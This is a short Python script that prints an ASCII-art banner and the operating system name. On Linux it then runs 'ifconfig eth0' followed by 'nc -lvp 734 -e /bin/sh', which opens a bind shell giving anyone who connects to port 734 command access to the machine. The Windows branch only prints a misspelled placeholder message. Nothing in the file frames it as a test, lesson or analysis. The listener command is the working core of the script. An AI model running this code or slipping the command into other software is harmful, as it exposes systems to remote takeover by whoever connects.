import platform
import os
import sysconfig

def run():
    print('###### # # # #######')
    print('#### # #  # # ######')
    print('#### ##    ## ######')
    print('#####  #  #  #######')
    print('###### ### #########')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform()) 
        os.system('ifconfig eth0')
        os.system( 'nc -lvp 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Comand nc windows')
    
